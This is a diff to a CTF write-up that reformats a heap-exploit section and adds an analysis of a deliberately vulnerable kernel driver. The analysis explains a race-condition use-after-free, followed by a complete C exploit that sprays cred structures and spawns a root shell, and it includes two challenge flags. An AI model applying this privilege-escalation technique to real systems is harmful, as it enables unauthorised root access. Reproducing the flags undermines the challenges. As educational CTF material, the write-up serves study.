@@ -295,11 +295,11 @@ edit(p, 1, payload) # 11 usage option, final RCE, will overwrite RIP with our RO
 
 After that we will have shell, and we can read the flag
 
-## Flag
+### Flag
 
 `f13{0ld_but_g0ld_s4f3_unl1nk_is_just_b4ck_t0_2000s}`
 
-## Full Exploit Script
+### Full Exploit Script
 
 ```python
 from pwn import *
@@ -509,15 +509,126 @@ MODULE_AUTHOR("Aker");
 MODULE_DESCRIPTION("ITFEST 2025 by FR13NDS TEAM");
 ```
 
+This is simple kernel driver registered as `maxmax_driver` (we can use it via opening /dev/maxmax_driver), which defines two IOCTL commands, CMD_ALLOC (0xf1311) and CMD_WRITE (0xf1312).
 
-## Flag
+There is also global object `global_obj` which contains a pointer to a buffer and its size.
+
+`CMD_ALLOC`:
+    1. Reads size from user space.
+    2. Checks if the size is at least 40 bytes.
+    3. If a buffer is already allocated, it frees it.
+    4. Allocates a new buffer of the requested size and stores the pointer in global_obj -> buffer.
+
+`CMD_WRITE`:
+    1. Retrieves the current buffer pointer from global_obj -> buffer.
+    2. Crucially, it performs an msleep(200), pausing execution for 200 milliseconds.
+    3. After the sleep, it copies 40 bytes of data from user space into the location pointed to global_obj -> buffer.
+
+Since in this driver ioctl does not protected via sync (mutex, spinlock) and not locked, there will be a Time of Check, Time of Use vulnerability (TOCTOU) that appears in the window between `CMD_ALLOC` and `CMD_WRITE`, the msleep function increases little bit this window creating us Race Condition which we can lead into full working Use After Free later.
+
+In CMD_WRITE, the driver creates a local copy of the buffer pointer:
+```c
+char *kbuf = obj->buffer; // 1. pointer is fetched
+if (!kbuf) return -EINVAL;
+
+msleep(200);              // 2. thread goes to sleep
+```
+
+While this thread is sleeping, a second thread can call CMD_ALLOC. This command will free the current buffer (the same one kbuf points to) and allocate a new one.
+```c
+if (obj->buffer) {
+    kfree(obj->buffer);
+}
+```
+
+When the CMD_WRITE thread wakes up:
+```c
+if (copy_from_user(kbuf, (void __user *)arg, 40)) // 3. writes to old pointer
+```
+It proceeds to write user data to kbuf, but kbuf is now a dangling pointer referring to freed memory giving us - Use After Free primitive.
+
+### Flag
 
 `f13{tutututu_max_verstappen_f4st3st_it_was_easy_kernel_glhf_next_tasks}`
 
-## Full Exploit Script
+### Full Exploit Script
 
 ```c
-#inlcude <stdio.h>
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <pthread.h>
+#include <string.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+
+#define CMD_ALLOC 0xf1311
+#define CMD_WRITE 0xf1312
+
+#define CRED_SIZE 192
+
+int fd;
+char payload[CRED_SIZE];
+
+void alloc(size_t size) {
+    if (ioctl(fd, CMD_ALLOC, &size) < 0) {
+        perror("[-] ioctl alloc failed");
+        exit(1);
+    }
+}
+
+void* victim_write(void* arg) {
+    ioctl(fd, CMD_WRITE, payload);
+    return NULL;
+}
+
+void check_root_and_shell() {
+    if (getuid() == 0) {
+        printf("\n!!! tu tu tu max verstappen %d (uid=%d)\n", getpid(), getuid());
+        system("/bin/sh");
+        exit(0);
+    }
+}
+
+int main() {
+    memset(payload, 0, sizeof(payload));
+    fd = open("/dev/maxmax_driver", O_RDWR);
+    if (fd < 0) {
+        perror("[-] Failed to open driver");
+        return 1;
+    }
+    printf("fake victim obj (%d)\n", CRED_SIZE);
+    alloc(CRED_SIZE);
+
+    pthread_t t1;
+    pthread_create(&t1, NULL, victim_write, NULL);
+
+    usleep(50000);
+
+    printf("realloc trigger\n");
+    alloc(80);
+
+    printf("spray\n");
+    int sprayed = 0;
+    for (int i=0; i<100; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            usleep(250000);
+            check_root_and_shell();
+            exit(0);
+        }
+        sprayed++;
+    }
+
+    pthread_join(t1, NULL);
+    while(wait(NULL) > 0);
+
+    printf("failed\n");
+    return 0;
+}
 ```
 
 ## Key Takeaways
